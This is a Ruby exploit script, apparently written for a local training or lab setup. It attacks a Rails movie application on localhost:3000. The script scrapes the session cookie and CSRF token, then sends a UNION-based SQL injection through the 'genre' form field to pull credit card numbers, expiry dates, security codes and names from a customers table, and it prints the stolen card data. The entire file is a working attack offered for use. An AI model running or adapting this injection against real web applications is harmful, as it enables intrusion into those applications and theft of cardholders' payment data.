require 'socket'

s = TCPSocket.open("localhost", 3000)

request = "GET /movies/selectGenre HTTP/1.0
Host: localhost:3000
Connection: close\r\n\r\n"

s.print request
response = s.read

session_id = response.match(/_session_id=(.*?);/)[0]
token = response.match(/authenticity_token.*value="(.*?)"/)[0].match(/value="(.*?)"/)[0][7..-2]

sql = "Action' AND '1' = '0' UNION SELECT name AS id, name AS title, card_number AS director, exp_month AS star, exp_year AS release_year, security_code AS genre, name AS rating FROM customers WHERE '1'='1"
data = "genre=" + sql + "&authenticity_token=" + token

request = "POST /movies/showGenre HTTP/1.0
Host: localhost:3000
Content-type: application/x-www-form-urlencoded
Cookie: #{session_id}
Content-length: #{data.length()}
Connection: close\r\n\r\n"

s = TCPSocket.open("localhost", 3000)
s.print request + data

while line = s.gets do
	if line.match /"even"|"odd"/

		while true
			s.gets
			puts "Credit Card Number: #{(s.gets)[12..-7]}"
			puts "Expiration Month: #{(s.gets)[12..-7]}"
			puts "Expiration Year: #{(s.gets)[12..-7]}"
			puts "Security Code: #{(s.gets)[12..-7]}"
			puts "Name: #{(s.gets)[12..-7]}\r\n\r\n"
			s.gets

			if s.gets.match /<\/table>/
				break
			end
		end
		break
	end
end
